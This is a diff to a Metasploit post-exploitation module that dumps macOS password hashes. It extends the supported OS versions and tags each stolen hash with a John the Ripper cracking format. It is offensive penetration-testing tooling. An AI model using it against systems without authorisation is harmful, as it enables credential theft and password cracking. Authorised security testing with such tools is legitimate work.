@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
             This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
-            versions 10.3 to 10.9.
+            versions 10.3 to 10.14.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -175,14 +175,26 @@ class MetasploitModule < Msf::Post
     when "NT"
       private_data = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}"
       private_type = :ntlm_hash
+      jtr_format = 'ntlm'
     when "LM"
       private_data = "#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}"
       private_type = :ntlm_hash
-    when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
+      jtr_format = 'lm'
+    when "SHA-512 PBKDF2"
       private_data = hash
       private_type = :nonreplayable_hash
+      jtr_format = 'PBKDF2-HMAC-SHA512'
+    when "SHA-512"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'sha512,crypt'
+    when "SHA-1"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'sha1'
     end
     create_credential(
+      jtr_format: jtr_format,
       workspace_id: myworkspace_id,
       origin_type: :session,
       session_id: session_db_id,
